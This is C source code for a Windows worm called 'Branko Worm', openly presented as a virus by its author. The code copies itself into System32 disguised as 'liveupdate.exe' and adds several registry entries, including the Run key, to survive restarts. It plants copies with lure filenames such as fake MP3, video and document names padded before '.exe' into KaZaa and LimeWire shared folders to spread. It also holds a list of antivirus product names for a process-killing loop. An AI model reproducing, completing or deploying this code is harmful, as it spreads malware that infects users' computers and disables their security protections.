/*================================================================
   Author : Undermine
   Virus Name: Branko Worm 
   http://undermine.bloger.hr
   Description:
      * Run at every startup
      * Infect drives & files
      * P2P Process
      * Taskkill av
Attempt to spread using predefined users/password list.
great thanks :  Lim Ci,  Mar'i, Kevin and "Maja for everything".
==================================================================*/
#include <windows.h>
#include <stdio.h>
#define PORT 80
#define USERS_NUM 93
#define PWD_NUM 107
#define VirSize	(9989+1)
#define LenID	(7+1)


const char *Taskkill[] = {"av","Av","AV","defend","Defend","DEFEND","f-","F-","defense","Defense","DEFENSE",
"Kaspersky","KASPERSKY","kaspersky","sophos","SOPHOS","Sophos","Scanner","SCANNER","scanner","Norton","norton",
"NORTON","Security","SECURITY","security","Anti","ANTI","anti","SCAN","Scan","scan","Malware","MALWARE","malware",
"Virus","VIRUS","virus","NOD32","nod32","Nod32","Zoner","ZONER","zoner","SECUR","Secur","secur","Dr.","DR.","DR.Web",0};
 
void FindDirectory(LPCSTR DirPath);
void FillArray(LPCSTR Directory);
 
char DirArray[250000][MAX_PATH];
int dircount = 0;
char windir[MAX_PATH];
HKEY hKey;
 
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 int count;
 char wormpath[256];
 GetWindowsDirectory(windir, sizeof(windir));
 HMODULE hMe = GetModuleHandle(NULL);
 DWORD nRet = GetModuleFileName(hMe, wormpath, 256);
 HKEY hKey;
 strcat(windir, "\\System32\\liveupdate.exe");
 CopyFile(wormpath, windir, 0);


 RegCreateKey (HKEY_CLASSES_ROOT, "CLSID\\{7A9D77BD-5403-11d2-8785-2E0420524153}", &hKey);
 RegSetValueEx (hKey, "Branko", 0, REG_SZ, (LPBYTE) windir, sizeof(windir));
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\InternetRegistry",&hKey);
 RegSetValueEx (hKey, "Branko", 0, REG_SZ, (LPBYTE) windir, sizeof(windir));
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\Remote",&hKey);
 RegSetValueEx (hKey, "Explorer", 0, REG_SZ, (LPBYTE) windir, sizeof(windir));
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
 RegSetValueEx (hKey, "Branko", 0, REG_SZ, (LPBYTE)windir, sizeof(windir));
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Kazaa\\Transfer", &hKey);
 RegSetValueEx (hKey, "Upload", 0, REG_SZ, (LPBYTE)windir, sizeof(windir)); 
 // small reg-help worm coz fuckednod32 want elimination De5 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Protected Storage System Provider\\S-1-5-21-1004336348-484061587-1177238915-500\\NoAction", &hKey);
 RegSetValueEx (hKey, "Branko", 0, REG_SZ, (LPBYTE)windir, sizeof(windir)); 
 
 RegCreateKey (HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows Live\\Communications Clients\\Share", &hKey);
 RegSetValueEx (hKey, "Send", 0, REG_SZ, (LPBYTE)windir, sizeof(windir)); 

 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\gratis.mp3.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\ladygaga.mp3                    .exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\maliciousremovaltool.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\ladyinbed.avi                    .exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\ReadMe!.nfo                    .exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\list-download.txt                    .exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\game-collection.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\porno+18.mpeg                    .exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\remoteotherkazaa.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\softpacked.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\LimeWire\\gratis.zip.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\LimeWire\\My Shared Folder\\spaceticket.doc                    .exe", 0);
 CopyFile(wormpath, "C:\\WINDOWS\\system32\\inetsrv.dll                    .exe", 0);
 {
     count = count ^ 5;
 }
 return 0;
}
int NeverAntiVirus(void)
{
	int c;
	while(1) {
		for(c=0;Taskkill[c]!=0;c++) system((char *)&Taskkill[c]);
		Sleep(1000);
	}
	return 0;
}

void FindDirectory(LPCSTR DirPath)
{
     WIN32_FIND_DATA FindData;
     HANDLE hFind;
     char Path[MAX_PATH];
     hFind = FindFirstFile(DirPath, &FindData);
     do
     {
         strcpy(Path, DirPath);
         Path[strlen(DirPath)-1] = 0;
         strcat(Path, FindData.cFileName);

         if ((FindData.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY || FindData.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY+FILE_ATTRIBUTE_SYSTEM) && (strstr(FindData.cFileName,".")==0))
         {
           FillArray(Path);
           strcat(Path,"\\*");
           FindDirectory(Path);
         }

     } while (FindNextFile(hFind,&FindData));
     FindClose(hFind);
}

void FillArray(LPCSTR Directory)
{
     lstrcpy(DirArray[dircount],Directory);
     dircount++;
} //payload with other worm family called hunatcha 
void Payload(void)
{
	char wormpath[MAX_PATH];
	GetModuleFileName(NULL, wormpath, MAX_PATH);
	strcat(windir, "\\System32\\liveupdate.exe");
	MessageBox (0, "Your system need to update my new world...", "Hunatcha Informer", MB_ICONINFORMATION | MB_OK);
}

